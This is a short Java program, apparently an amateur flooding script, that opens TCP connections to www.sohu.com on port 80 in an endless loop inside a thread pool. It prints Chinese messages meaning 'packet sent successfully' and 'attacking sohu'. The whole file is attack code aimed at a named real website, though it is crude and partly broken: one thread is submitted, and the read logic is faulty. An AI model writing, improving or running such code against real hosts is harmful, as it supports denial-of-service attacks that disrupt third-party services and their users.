package com.mytest;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
public class Attack {
    public Attack() {
        // TODO Auto-generated constructor stub
    }
    public static void main(String[] args){
        ExecutorService es = Executors.newFixedThreadPool(1000);
        Mythread mythread = new Mythread();
        Thread thread = new Thread(mythread);
//        for(int i = 0;i<10000;i++){
            es.execute(thread);
//        }
    }
}
class Mythread implements Runnable {
    public void run() {
        while(true){
            try {
                Socket socket = new Socket("www.sohu.com", 80);
//                socket.

                System.out.println("发包成功！");
                BufferedInputStream bis = new BufferedInputStream(socket.getInputStream());
                byte[] bytes = new byte[1024];
                int len = -1;
                StringBuffer sb = new StringBuffer();
               
                    if(bis != null){
                        if((len = bis.read()) != -1){
//                        		System.out.println(bis.read());
                            sb.append(new String (bytes,0,len));
                            System.out.println(sb.toString());
                            System.out.println("攻击sohu！");
                            bis.close();
//                            System.out.println(sb.toString());
                        }
                    }                    
            } catch (MalformedURLException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            
        }
    }
} 